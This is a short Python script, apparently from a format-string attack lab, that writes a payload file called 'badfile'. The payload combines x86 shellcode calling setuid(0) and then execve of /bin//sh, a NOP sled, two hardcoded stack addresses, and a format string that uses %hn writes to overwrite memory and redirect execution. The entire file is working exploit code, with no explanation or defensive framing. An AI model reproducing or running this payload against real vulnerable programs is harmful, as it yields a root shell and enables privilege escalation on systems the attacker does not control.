#!/usr/bin/python3

import sys

shellcode = (
	"\x31\xc0\x31\xdb\xb0\xd5\xcd\x80"
	"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50"
	"\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00"
).encode('latin-1')

N = 200

content = bytearray(0x90 for i in range(N))
start = N - len(shellcode)
content[start:] = shellcode

addr1 = 0xffffd13c
addr2 = 0xffffd13e
content[0:4] = (addr1).to_bytes(4, byteorder='little')
content[4:8] = ("@@@@").encode('latin-1')
content[8:12] = (addr2).to_bytes(4, byteorder='little')

small = 0xd1f4 - 12 - 19*8
large = 0xffff - 0xd1f4
s = "%.8x"*19 + "%." + str(small) + "x%hn%." + str(large) + "x%hn"
fmt = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt

with open('badfile', 'wb') as wb:
	wb.write(content)